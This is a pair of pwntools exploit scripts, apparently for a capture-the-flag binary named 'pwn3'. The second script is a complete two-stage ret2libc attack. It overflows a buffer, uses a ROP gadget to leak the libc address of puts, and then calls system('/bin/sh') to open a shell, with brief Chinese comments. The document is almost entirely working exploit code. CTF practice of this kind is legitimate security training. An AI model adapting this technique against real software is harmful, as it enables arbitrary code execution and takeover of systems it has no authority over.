



```python
from pwn import *

context.log_level= "debug"

io = process("./pwn3")

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(io)
#pause()


io.sendlineafter('Input:',payload)

io.interactive()
```





```python
from pwn import *

context.log_level= "debug"

io = process("./pwn3")
elf = ELF('./pwn3')
libc = elf.libc

#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(io)
#pause()

vuln_addr = 0x400626
main_addr = 0x40064C
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
rdi_ret = 0x400713

payload = b"A" * 0x10
payload += p64(0xdeadbeef)

payload += p64(rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(vuln_addr) # 再跳回来一次
# 第一次泄漏puts地址,第二次算出/bin/sh。system地址


io.sendlineafter("Input:\n",payload)

content = io.readline()[:-1]
libc_base = u64(content.ljust(8,b'\x00')) - libc.sym['puts']
log.info('libc_base:' + hex(libc_base))

system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search(b'/bin/sh').__next__()

payload = b"B" * 0x10
payload += p64(0xdeadbeaf)

payload += p64(rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

io.sendlineafter('Input:',payload)

io.interactive()
```

